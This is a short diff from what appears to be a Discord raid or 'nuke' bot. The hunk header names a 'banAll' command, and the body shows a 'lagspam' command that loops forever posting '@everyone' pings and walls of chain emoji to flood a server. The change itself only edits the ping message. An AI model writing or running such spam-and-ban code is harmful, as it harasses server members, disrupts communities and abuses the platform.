@@ -97,7 +97,7 @@ async def banAll(ctx):
 @bot.command()
 async def lagspam(ctx):
   while True:
-    await ctx.send('@everyone :monkey:')
+    await ctx.send('@everyone')
     await ctx.send(" :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains:  :chains: ")
 
 @bot.command()
